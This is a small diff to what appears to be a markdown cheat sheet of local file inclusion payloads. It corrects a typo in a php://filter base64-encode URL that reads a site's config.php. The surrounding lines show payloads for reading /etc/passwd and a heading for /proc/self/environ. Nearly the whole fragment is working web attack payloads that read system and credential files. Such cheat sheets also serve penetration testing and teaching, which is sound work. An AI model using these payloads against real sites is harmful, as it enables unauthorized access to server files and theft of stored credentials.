@@ -9,7 +9,7 @@ http://site.com/lfi.php?page=/etc/passwd
 ```
 http://www.site.com/lfi.php?page=php://filter/resource=config.php
 
-http://www.site.com/lfi.php?page=php://filter/conver.base64-encode/resource=config.php
+http://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php
 ```
 
 ## 3) /proc/self/environ
